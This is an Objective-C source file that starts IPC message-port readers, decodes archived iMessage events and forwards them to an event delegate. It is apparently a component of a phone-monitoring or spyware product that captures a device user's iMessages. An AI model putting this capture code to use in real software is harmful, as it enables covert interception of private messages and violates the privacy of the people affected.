//
//  IMessageCaptureManager.m
//  iMessageCaptureManager
//
//  Created by Makara Khloth on 2/1/12.
//  Copyright 2012 __MyCompanyName__. All rights reserved.
//

#import "IMessageCaptureManager.h"

#import "DefStd.h"
#import "EventCenter.h"
#import "FxIMEvent.h"
#import "FxIMEventUtils.h"

@implementation IMessageCaptureManager

- (id) initWithEventDelegate: (id <EventDelegate>) aEventDelegate {
	if ((self = [super init])) {
		mEventDelegate = aEventDelegate;
	}
	return (self);
}

- (void) startCapture {
	if (!mMessagePortReader1) {
		mMessagePortReader1 = [[MessagePortIPCReader alloc] initWithPortName:kiMessageMessagePort1 
												  withMessagePortIPCDelegate:self];
		[mMessagePortReader1 start];
	}
	if (!mMessagePortReader2) {
		mMessagePortReader2 = [[MessagePortIPCReader alloc] initWithPortName:kiMessageMessagePort2 
												  withMessagePortIPCDelegate:self];
		[mMessagePortReader2 start];
	}
}

- (void) stopCapture {
	if (mMessagePortReader1) {
		[mMessagePortReader1 stop];
		[mMessagePortReader1 release];
		mMessagePortReader1 = nil;
	}
	if (mMessagePortReader2) {
		[mMessagePortReader2 stop];
		[mMessagePortReader2 release];
		mMessagePortReader2 = nil;
	}
}

- (void) dataDidReceivedFromMessagePort: (NSData*) aRawData {
	NSKeyedUnarchiver *unarchiver = [[NSKeyedUnarchiver alloc] initForReadingWithData:aRawData];
    FxIMEvent *imEvent = [unarchiver decodeObjectForKey:kiMessageArchived];
	DLog(@"IMessage - imEvent = %@", imEvent);
    [unarchiver finishDecoding];
	if ([mEventDelegate respondsToSelector:@selector(eventFinished:)]) {
		NSArray *imStructureEvents = [FxIMEventUtils digestIMEvent:imEvent];
		for (FxEvent *imStructureEvent in imStructureEvents) {
			[mEventDelegate performSelector:@selector(eventFinished:) withObject:imStructureEvent];
		}
	}
	[unarchiver release];
}

- (void) dealloc {
	[self stopCapture];
	[super dealloc];
}

@end
